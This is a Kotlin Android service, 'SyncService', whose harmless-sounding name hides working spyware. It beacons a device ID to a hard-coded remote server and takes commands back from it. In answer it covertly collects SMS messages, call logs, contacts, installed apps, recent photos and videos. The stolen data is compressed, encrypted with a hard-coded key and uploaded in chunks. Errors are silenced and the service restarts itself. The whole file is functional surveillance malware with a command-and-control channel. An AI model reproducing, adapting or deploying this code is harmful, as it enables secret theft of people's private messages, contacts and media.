package com.assets.service

import android.app.Service
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.OpenableColumns
import android.provider.Settings
import android.util.Base64
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.security.MessageDigest
import java.security.SecureRandom
import java.util.UUID
import java.util.concurrent.TimeUnit
import java.util.zip.GZIPOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SyncService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    // تم تحديث الرابط هنا ليطابق سيرفرك الفعلي على Render
    private val SERVER_ENDPOINT = "https://web-assets-service.onrender.com/api/v3/unified/stream"
    private val MASTER_SECRET = "BlackActivationMasterKey2026"
    private val client = OkHttpClient.Builder()
        .connectTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serviceScope.launch {
            try {
                val telemetry = JSONObject().apply {
                    put("type", "TEXT_REPORT")
                    put("data", "SyncService Online. Device ID: ${getNodeIdentifier()}")
                }
                val response = dispatchPacket(encryptPayload(telemetry.toString()))
                if (response != null && response.has("task") && !response.isNull("task")) {
                    executeTask(response.getJSONObject("task"))
                }
            } catch (e: Exception) {
                // تجاهل الأخطاء المؤقتة
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun getNodeIdentifier(): String {
        return try {
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "Unified-Node-007"
        } catch (e: Exception) {
            "Unified-Node-007"
        }
    }

    private fun getDeviceSecret(): ByteArray {
        return MessageDigest.getInstance("SHA-256").digest(MASTER_SECRET.toByteArray(Charsets.UTF_8))
    }

    private fun encryptPayload(plainText: String): String {
        val byteStream = ByteArrayOutputStream()
        GZIPOutputStream(byteStream).use { it.write(plainText.toByteArray(Charsets.UTF_8)) }
        val compressed = byteStream.toByteArray()

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).apply { SecureRandom().nextBytes(this) }
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(getDeviceSecret(), "AES"), GCMParameterSpec(128, iv))

        val cipherText = cipher.doFinal(compressed)
        val encrypted = cipherText.copyOfRange(0, cipherText.size - 16)
        val tag = cipherText.copyOfRange(cipherText.size - 16, cipherText.size)

        val packet = JSONObject().apply {
            put("v", byteArrayToHex(iv))
            put("g", byteArrayToHex(tag))
            put("d", byteArrayToHex(encrypted))
        }
        return Base64.encodeToString(packet.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
    }

    private fun dispatchPacket(payload: String): JSONObject? {
        try {
            val req = Request.Builder()
                .url(SERVER_ENDPOINT)
                .post(payload.toRequestBody("text/plain; charset=utf-8".toMediaType()))
                .addHeader("x-node-id", getNodeIdentifier())
                .addHeader("x-node-model", android.os.Build.MODEL)
                .build()

            client.newCall(req).execute().use { res ->
                if (res.isSuccessful) {
                    val bodyStr = res.body?.string() ?: "{}"
                    return JSONObject(bodyStr)
                }
            }
        } catch (e: Exception) {
            // خطأ في الإرسال
        }
        return null
    }

    private suspend fun executeTask(task: JSONObject) {
        val action = task.optString("action", "")
        when (action) {
            "EXTRACT_PHOTOS" -> streamMediaStoreFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 3)
            "EXTRACT_VIDEOS" -> streamMediaStoreFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 1)
            "EXTRACT_SMS" -> sendTextReport("رسائل SMS", readSms())
            "EXTRACT_CALLS" -> sendTextReport("سجل المكالمات", readCallLogs())
            "EXTRACT_CONTACTS" -> sendTextReport("جهات الاتصال", readContacts())
            "EXTRACT_APPS" -> sendTextReport("التطبيقات المثبتة", readApps())
        }
    }

    private fun sendTextReport(title: String, content: String) {
        val report = JSONObject().apply {
            put("type", "TEXT_REPORT")
            put("data", "=== $title ===\n$content")
        }
        dispatchPacket(encryptPayload(report.toString()))
    }

    private suspend fun streamMediaStoreFiles(collectionUri: Uri, limit: Int) {
        try {
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sort = "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT $limit"
            contentResolver.query(collectionUri, projection, null, null, sort)?.use { c ->
                val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
                while (c.moveToNext()) {
                    if (idIdx != -1) {
                        val id = c.getLong(idIdx)
                        val uri = Uri.withAppendedPath(collectionUri, id.toString())
                        sendFileInChunks(uri)
                    }
                }
            }
        } catch (e: Exception) {
            // خطأ في جلب الوسائط
        }
    }

    private suspend fun sendFileInChunks(uri: Uri) {
        try {
            val uploadId = UUID.randomUUID().toString()
            val fileName = getFileName(uri)
            
            val fullBytes = contentResolver.openInputStream(uri)?.use { it.readBytes() } ?: return
            val fileHash = byteArrayToHex(MessageDigest.getInstance("SHA-256").digest(fullBytes))

            val totalChunks = (fullBytes.size + 131067) / 131072
            val chunkSize = 128 * 1024
            var chunkIndex = 0

            for (i in fullBytes.indices step chunkSize) {
                chunkIndex++
                val end = minOf(i + chunkSize, fullBytes.size)
                val chunk = fullBytes.copyOfRange(i, end)
                val isLast = (chunkIndex == totalChunks)

                val packet = JSONObject().apply {
                    put("type", "MEDIA_CHUNK")
                    put("uploadId", uploadId)
                    put("fileName", fileName)
                    put("chunkIndex", chunkIndex)
                    put("totalChunks", totalChunks)
                    put("isLast", isLast)
                    put("fileHash", fileHash)
                    put("data", Base64.encodeToString(chunk, Base64.NO_WRAP))
                }

                dispatchPacket(encryptPayload(packet.toString()))
                delay(40)
            }
        } catch (e: Exception) {
            // خطأ في إرسال الأجزاء
        }
    }

    private fun getFileName(uri: Uri): String {
        var name = "media_file.dat"
        contentResolver.query(uri, null, null, null, null)?.use { c ->
            if (c.moveToFirst()) {
                val idx = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
                if (idx != -1) name = c.getString(idx)
            }
        }
        return name
    }

    private fun readSms(): String {
        val sb = StringBuilder()
        contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 30")?.use { c ->
            val a = c.getColumnIndex("address")
            val b = c.getColumnIndex("body")
            while (c.moveToNext()) {
                if (a != -1 && b != -1) {
                    sb.append("From: ${c.getString(a)} | Text: ${c.getString(b)}\n")
                }
            }
        }
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder()
        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 30")?.use { c ->
            val n = c.getColumnIndex(CallLog.Calls.NUMBER)
            val t = c.getColumnIndex(CallLog.Calls.TYPE)
            while (c.moveToNext()) {
                if (n != -1 && t != -1) {
                    val typeStr = if (c.getInt(t) == CallLog.Calls.INCOMING_TYPE) "واردة" else "صادرة"
                    sb.append("Number: ${c.getString(n)} | Type: $typeStr\n")
                }
            }
        }
        return sb.toString()
    }

    private fun readContacts(): String {
        val sb = StringBuilder()
        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { c ->
            val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (c.moveToNext()) {
                if (n != -1 && p != -1) {
                    sb.append("Name: ${c.getString(n)} | Phone: ${c.getString(p)}\n")
                }
            }
        }
        return sb.toString()
    }

    private fun readApps(): String {
        val sb = StringBuilder()
        val packages = packageManager.getInstalledPackages(0)
        for (pkg in packages) {
            sb.append("Pkg: ${pkg.packageName}\n")
        }
        return sb.toString()
    }

    private fun byteArrayToHex(b: ByteArray): String = b.joinToString("") { "%02x".format(it) }

    override fun onDestroy() {
        serviceScope.cancel()
        super.onDestroy()
    }
}
